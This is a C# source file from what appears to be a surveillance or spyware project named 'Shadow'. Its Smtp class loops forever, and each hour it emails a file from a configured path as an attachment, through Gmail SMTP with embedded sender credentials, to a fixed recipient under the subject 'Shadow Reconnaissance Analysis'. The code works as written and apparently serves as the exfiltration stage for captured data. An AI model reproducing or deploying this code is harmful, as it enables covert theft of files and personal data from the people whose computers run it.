using System;
using System.Net.Mail;
using System.Net.Mime;
using System.Threading.Tasks;

namespace Shadow
{
    public class Smtp
    {
        private String From { get; set; }
        private String Key { get; set; }
        private String To { get; set; }
        private String Path { get; set; }

        public Smtp(String from, String key, String to, String path)
        {
            From = from;
            Key = key;
            To = to;
            Path = path;
        }

        public async Task Start()
        {
            // Email Loop
            await Task.Run(async () =>
            {
                while (true)
                {
                    await Task.Delay(3600 * 1000);
                    Send();
                }
            });
        }

        private void Send()
        {
            try
            {
                // Client 
                var Client = new SmtpClient("smtp.gmail.com", 587);
                Client.UseDefaultCredentials = false;
                var Authentication = new System.Net.NetworkCredential(this.From, this.Key);
                Client.Credentials = Authentication;
                Client.EnableSsl = true;

                // Sender & Reciever
                var From = new MailAddress(this.From, "Shadow");
                var To = new MailAddress(this.To);
                var Mail = new System.Net.Mail.MailMessage(From, To);

                // Subject
                Mail.Subject = "Shadow Reconnaissance Analysis";
                Mail.SubjectEncoding = System.Text.Encoding.UTF8;

                // Body
                Mail.Body = "Hello World!";
                Mail.BodyEncoding = System.Text.Encoding.UTF8;
                Mail.IsBodyHtml = true;

                // Add Attachments
                var Attachment = new Attachment(this.Path, MediaTypeNames.Application.Octet);
                var Disposition = Attachment.ContentDisposition;
                Disposition.CreationDate = System.IO.File.GetCreationTime(this.Path);
                Disposition.ModificationDate = System.IO.File.GetLastWriteTime(this.Path);
                Disposition.ReadDate = System.IO.File.GetLastAccessTime(this.Path);
                Mail.Attachments.Add(Attachment);

                Client.Send(Mail);
            }
            catch (Exception e)
            {
                throw e;
            }
        }
    }
}
